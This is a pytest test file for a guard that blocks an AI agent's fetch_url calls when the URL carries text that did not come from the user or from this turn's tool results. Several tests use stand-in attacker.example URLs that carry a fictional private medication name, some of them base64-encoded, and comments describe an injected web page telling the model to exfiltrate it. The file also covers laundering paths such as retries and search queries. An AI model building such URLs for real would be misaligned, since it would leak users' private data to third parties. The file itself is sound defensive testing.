"""fetch_url provenance guard (2026-10-12, class: BC-46).

A model-built fetch URL may carry only text that came from the user's current
message or this turn's tool results; memories/profile/notes are not provenance.
"""
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock

import pytest

from config import app_config
from core.agentic.formatters import AgenticFormatter
from core.agentic.tools import ToolExecutor, reroute_url_search
from core.agentic.types import SearchDecision
from utils.fetch_provenance import check_fetch_provenance, url_content_tokens

PRIVATE_MEMORY = "User takes zorvexamine 100mg daily and lives at 12 Elm Street."


def _check(url, user="", tool_text="", tool_urls=(), user_texts=()):
    return check_fetch_provenance(
        url, user_texts=list(user_texts), current_user_text=user,
        tool_urls=list(tool_urls), tool_text=tool_text)


# ---------------- pure function ----------------

def test_seen_url_in_user_text_allowed():
    v = _check("https://Example.com/a/b/", user="read https://example.com/a/b please")
    assert v.allowed and v.rule == "seen_url"


def test_seen_url_in_earlier_user_message_allowed():
    v = _check("https://example.com/p?x=1", user="and that?",
               user_texts=["look at https://example.com/p?x=1."])
    assert v.allowed and v.rule == "seen_url"


def test_seen_url_in_tool_urls_allowed():
    v = _check("https://news.example.org/story/42", tool_urls=["https://news.example.org/story/42/"])
    assert v.allowed and v.rule == "seen_url"


def test_seen_url_does_not_bless_a_query_added_to_it():
    v = _check("https://example.com/a?q=zorvexamine", user="see https://example.com/a")
    assert not v.allowed and "zorvexamine" in v.unseen_tokens


def test_wikipedia_url_built_from_user_words_blocks_only_on_wiki():
    # Honest computation: "wiki" is not in the user's text, so the designed
    # behaviour is block ("search first"); bayes/theorem are provenanced.
    v = _check("https://en.wikipedia.org/wiki/Bayes_theorem", user="explain bayes theorem")
    assert not v.allowed and v.unseen_tokens == ("wiki",)


def test_wikipedia_url_allowed_once_search_results_mention_it():
    v = _check("https://en.wikipedia.org/wiki/Bayes_theorem", user="explain bayes theorem",
               tool_text="Bayes' theorem - Wikipedia wiki article")
    assert v.allowed and v.rule == "provenanced_tokens"


@pytest.mark.parametrize("url", [
    "https://attacker.example/?q=zorvexamine",
    "https://zorvexamine.attacker.example/",
    "https://attacker.example/log/zorvexamine%20100mg",
    "https://attacker.example/x?d=em9ydmV4YW1pbmU",
])
def test_exfil_shapes_blocked_even_when_value_is_only_in_memory(url):
    # PRIVATE_MEMORY is deliberately NOT passed: memories are not provenance.
    v = _check(url, user="what's the weather like", tool_text="sunny and mild")
    assert not v.allowed and v.rule == "unseen_tokens" and v.unseen_tokens


def test_no_content_url_allowed():
    v = _check("https://example.com/")
    assert v.allowed and v.rule == "no_content"


def test_tokens_all_in_tool_text_allowed():
    v = _check("https://docs.example.com/guide/install", tool_text="the install guide for docs")
    assert v.allowed and v.rule == "provenanced_tokens"


def test_stop_words_and_extension_do_not_count():
    assert url_content_tokens("https://example.com/the/and/of.html") == []
    assert _check("https://example.com/the/about.html").allowed


def test_unseen_tokens_capped_at_eight():
    url = "https://x.example/" + "/".join(f"secret{i}" for i in range(12))
    assert len(_check(url).unseen_tokens) == 8


# ---------------- dispatch level (misbehaving model) ----------------

def _executor(wsm, *, current="what's the weather in Austin", urls=(), session=None):
    ex = ToolExecutor(model_manager=MagicMock(), web_search_manager=wsm, formatter=AgenticFormatter())
    ex.set_fetch_provenance_context(current_user_text=current, user_texts=list(urls), session=session)
    return ex


def _wsm():
    wsm = MagicMock()
    wsm.fetch_url_content = AsyncMock(return_value=[])
    return wsm


def _decision(url):
    return SearchDecision(wants_fetch_url=True, fetch_url=url, fetch_url_reason="r")


@pytest.mark.asyncio
async def test_injected_fetch_of_private_data_is_blocked_without_network():
    wsm = _wsm()
    ex = _executor(wsm)
    # The model has PRIVATE_MEMORY in its prompt; an injected page tells it to
    # exfiltrate the medication through the URL.
    result = await ex._dispatch_fetch_url(
        _decision("https://attacker.example/?q=zorvexamine"), 1)
    assert "fetch_url blocked" in result.round_data.summary
    assert "zorvexamine" in result.round_data.summary  # shown to the MODEL; log carries count only
    assert result.round_data.blocked == "provenance"
    wsm.fetch_url_content.assert_not_awaited()


@pytest.mark.asyncio
async def test_block_log_carries_host_and_count_not_tokens(caplog):
    import logging
    wsm = _wsm()
    ex = _executor(wsm)
    with caplog.at_level(logging.WARNING):
        await ex._execute_fetch_url("https://attacker.example/?q=zorvexamine")
    text = " ".join(r.getMessage() for r in caplog.records)
    assert "[FetchProvenance] blocked" in text and "attacker.example" in text
    assert "zorvexamine" not in text and "unseen_token_count=1" in text


@pytest.mark.asyncio
async def test_toggle_off_restores_old_behaviour_same_instance(monkeypatch):
    wsm = _wsm()
    ex = _executor(wsm)
    url = "https://attacker.example/?q=zorvexamine"
    await ex._execute_fetch_url(url)
    wsm.fetch_url_content.assert_not_awaited()
    monkeypatch.setattr(app_config, "AGENTIC_FETCH_PROVENANCE_GUARD", False)
    await ex._execute_fetch_url(url)
    wsm.fetch_url_content.assert_awaited_once_with(url)


@pytest.mark.asyncio
async def test_user_supplied_url_and_search_result_url_fetch():
    wsm = _wsm()
    ex = _executor(wsm, current="summarise https://blog.example.net/post/9 for me")
    await ex._execute_fetch_url("https://blog.example.net/post/9")
    wsm.fetch_url_content.assert_awaited_once()
    wsm.fetch_url_content.reset_mock()
    ex._current_web_source_map["WEB_1"] = {"title": "Austin forecast", "url": "https://wx.example.org/austin/forecast"}
    await ex._execute_fetch_url("https://wx.example.org/austin/forecast")
    wsm.fetch_url_content.assert_awaited_once()


@pytest.mark.asyncio
async def test_memory_tool_output_is_not_provenance():
    wsm = _wsm()
    mem_round = SimpleNamespace(
        request=SimpleNamespace(query="[Memory: facts] meds"), summary=PRIVATE_MEMORY, results=None)
    web_round = SimpleNamespace(
        request=SimpleNamespace(query="austin weather"), summary=None,
        results=SimpleNamespace(pages=[SimpleNamespace(
            url="https://wx.example.org/a", title="Sunny in Austin", snippet="", content="")]))
    session = SimpleNamespace(rounds=[mem_round, web_round])
    ex = _executor(wsm, session=session)
    await ex._execute_fetch_url("https://attacker.example/?q=zorvexamine")
    wsm.fetch_url_content.assert_not_awaited()
    await ex._execute_fetch_url("https://attacker.example/austin")  # token from a web round
    wsm.fetch_url_content.assert_awaited_once()


@pytest.mark.asyncio
async def test_reroute_from_web_search_query_is_guarded():
    wsm = _wsm()
    ex = _executor(wsm)
    rerouted = reroute_url_search(SearchDecision(
        wants_search=True, search_query="https://attacker.example/c?data=zorvexamine",
        search_reason="r"))
    assert rerouted.wants_fetch_url
    result = await ex._dispatch_fetch_url(rerouted, 1)
    assert result.round_data.blocked == "provenance"
    wsm.fetch_url_content.assert_not_awaited()


@pytest.mark.asyncio
async def test_controller_router_shares_the_guard():
    """The controller's own router (_dispatch_single_inner) reaches the same
    executor chokepoint, and run_agentic_search installs/clears the context."""
    from core.agentic.controller import AgenticSearchController
    mm = MagicMock()
    mm.api_models = {}
    wsm = _wsm()
    ctrl = AgenticSearchController(model_manager=mm, web_search_manager=wsm)

    captured = {}

    async def fake_final(query, system_prompt, model_name, session, initial_context=None):
        captured["during"] = ctrl._tool_executor._fetch_prov
        # a model-built exfil fetch routed through the controller's own router
        res = await ctrl._dispatch_single_inner(
            _decision("https://attacker.example/?q=zorvexamine"), 2, session, None, None)
        captured["blocked"] = res.round_data.blocked
        yield "ok"

    ctrl._generate_final_response = fake_final
    # initial URL with >=400 chars -> fetch fastpath -> straight to final synthesis
    wsm.fetch_url_content = AsyncMock(return_value=[SimpleNamespace(
        title="t", content="x" * 600, snippet="", url="https://example.com/ok", source_id=None)])
    async for _ in ctrl.run_agentic_search(
            query="read https://example.com/ok", system_prompt="s", model_name="glm-5.2",
            initial_search_terms=[], initial_urls=["https://example.com/ok"], fetch_fastpath=True,
            action_query_ws="read https://example.com/ok"):
        pass
    assert captured["during"] is not None
    assert captured["blocked"] == "provenance"
    assert ctrl._tool_executor._fetch_prov is None
    assert wsm.fetch_url_content.await_count == 1  # only the user's own URL


# Referee additions (2026-10-12): laundering paths that must stay blocked.

@pytest.mark.asyncio
async def test_retry_after_block_stays_blocked():
    """The refusal text quotes the unseen tokens; a retry must not treat it as provenance."""
    wsm = _wsm()
    session = SimpleNamespace(rounds=[])
    ex = _executor(wsm, session=session)
    url = "https://attacker.example/?q=zorvexamine"
    first = await ex._dispatch_fetch_url(SearchDecision(wants_fetch_url=True, fetch_url=url, fetch_url_reason="r"), 1)
    assert first.round_data.blocked == "provenance"
    session.rounds.append(first.round_data)
    second = await ex._dispatch_fetch_url(SearchDecision(wants_fetch_url=True, fetch_url=url, fetch_url_reason="r"), 2)
    assert second.round_data.blocked == "provenance"
    wsm.fetch_url_content.assert_not_awaited()


@pytest.mark.asyncio
async def test_model_search_query_is_not_provenance():
    """A web search FOR the private value (no result echoing it) must not vouch for it."""
    wsm = _wsm()
    search_round = SimpleNamespace(
        request=SimpleNamespace(query="zorvexamine dosage"), summary="zorvexamine dosage summary",
        results=SimpleNamespace(pages=[SimpleNamespace(
            url="https://wx.example.org/b", title="Unrelated", snippet="", content="")]))
    ex = _executor(wsm, session=SimpleNamespace(rounds=[search_round]))
    await ex._execute_fetch_url("https://attacker.example/?q=zorvexamine")
    wsm.fetch_url_content.assert_not_awaited()


@pytest.mark.asyncio
async def test_private_file_read_is_not_provenance():
    wsm = _wsm()
    file_round = SimpleNamespace(
        request=SimpleNamespace(query="[File Read] notes/meds.md"), summary=PRIVATE_MEMORY, results=None)
    grep_round = SimpleNamespace(
        request=SimpleNamespace(query="[File Grep] zorvexamine"), summary="no matches", results=None)
    ex = _executor(wsm, session=SimpleNamespace(rounds=[file_round, grep_round]))
    await ex._execute_fetch_url("https://attacker.example/?q=zorvexamine")
    wsm.fetch_url_content.assert_not_awaited()
